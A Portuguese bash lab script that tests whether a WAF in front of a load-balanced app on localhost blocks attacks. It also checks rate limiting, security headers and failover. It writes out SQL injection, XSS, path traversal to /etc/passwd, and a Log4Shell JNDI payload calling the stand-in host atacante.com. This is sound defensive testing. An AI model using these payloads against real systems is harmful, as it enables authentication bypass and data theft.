#!/usr/bin/env bash
cd "$(dirname "$0")"
URL=http://localhost:2222
UA="Mozilla/5.0 (teste-laboratorio)"

code()   { curl -s -o /dev/null -w "%{http_code}" -A "$UA" "$@"; }
login()  { code -X POST --data-urlencode "username=$1" --data-urlencode "password=$2" "$URL/api/login"; }
linha()  { printf "  %-32s %-10s %-10s\n" "$1" "$2" "$3"; }
titulo() { echo; echo "== $1 =="; }

MODO=$(grep '^WAF_MODE=' .env | cut -d= -f2)
echo "URL: $URL | Modo do WAF: $MODO"
echo "Codigos: 200 ok | 401 senha errada | 403 bloqueado pelo WAF | 405/415 politica | 429 rate limit"

titulo "1. Balanceamento de carga"
for i in $(seq 1 6); do curl -s -A "$UA" "$URL/api/status"; echo; done

titulo "2. Formulario de login"
linha "Teste" "Obtido" "Esperado com WAF On"
linha "Login valido (root/root)"        "$(login root root)"                          "200"
linha "Senha errada"                    "$(login root errada)"                        "401"
linha "SQLi: ' OR 1=1 --"               "$(login "' OR 1=1 --" x)"                    "403"
linha "SQLi: admin' --"                 "$(login "admin' --" x)"                      "403"
linha "SQLi na senha: ' OR '1'='1"      "$(login root "' OR '1'='1")"                 "403"
linha "SQLi: UNION SELECT"              "$(login "' UNION SELECT 'hacker' --" x)"     "403"
linha "XSS: <script>"                   "$(login '<script>alert(1)</script>' x)"      "403"
linha "XSS: <img onerror>"              "$(login '<img src=x onerror=alert(1)>' x)"   "403"
echo "  Com o WAF Off: os SQLi retornam 200 (login sem senha) e os XSS retornam 401"
echo "  (no navegador o XSS executa, porque a pagina insere o usuario como HTML)."

titulo "3. Ataques via parametro GET (/api/busca)"
linha "Teste" "Obtido" "Esperado com WAF On"
linha "SQL Injection (UNION)" "$(code "$URL/api/busca?q=1%27%20UNION%20SELECT%20username%2Csenha_hash%20FROM%20usuarios--")" "403"
linha "XSS (img onerror)"     "$(code "$URL/api/busca?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E")" "403"
linha "Path Traversal"        "$(code "$URL/api/busca?q=..%2F..%2F..%2Fetc%2Fpasswd")" "403"
linha "Log4Shell (JNDI)"      "$(code "$URL/api/busca?q=%24%7Bjndi%3Aldap%3A%2F%2Fatacante.com%2Fa%7D")" "403"

titulo "4. Regras customizadas e politicas do WAF"
linha "Teste" "Obtido" "Esperado com WAF On"
linha "User-Agent sqlmap"           "$(curl -s -o /dev/null -w '%{http_code}' -A 'sqlmap/1.8' $URL/)" "403"
linha "Sem User-Agent"              "$(curl -s -o /dev/null -w '%{http_code}' -H 'User-Agent:' $URL/)" "403"
linha "Caminho /admin"              "$(code $URL/admin)" "403"
linha "Arquivo /.env"               "$(code $URL/.env)" "403"
linha "Endpoint interno /lb-status" "$(code $URL/lb-status)" "403"
linha "Parametro debug=true"        "$(code "$URL/api/status?debug=true")" "403"
linha "GET no login"                "$(code $URL/api/login)" "405"
linha "Content-Type text/plain"     "$(code -X POST -H 'Content-Type: text/plain' --data 'a' $URL/api/login)" "415"
linha "Usuario com 100 caracteres"  "$(login "$(printf 'a%.0s' $(seq 1 100))" x)" "403"
linha "Parametro duplicado (HPP)"   "$(code -X POST --data 'username=a&username=b&password=x' $URL/api/login)" "403"
linha "Metodo PUT"                  "$(code -X PUT $URL/)" "403"

titulo "5. Cabecalhos de seguranca"
curl -sI -A "$UA" $URL/ | grep -iE '^(server|x-frame|x-content-type|referrer|permissions|content-security|cross-origin|x-xss|cache-control|x-upstream)' | sed 's/^/  /'

titulo "6. Forca bruta no login (30 senhas erradas)"
for i in $(seq 1 30); do login root "errada$i"; echo; done | sort | uniq -c | sed 's/^/  /'
echo "  429 = bloqueado pelo rate limit do nginx (10 tentativas por minuto)."

titulo "7. Failover: derrubando app2"
docker stop app2 > /dev/null
for i in $(seq 1 6); do curl -s -A "$UA" "$URL/api/status"; echo; done
echo "  Religando app2..."
docker start app2 > /dev/null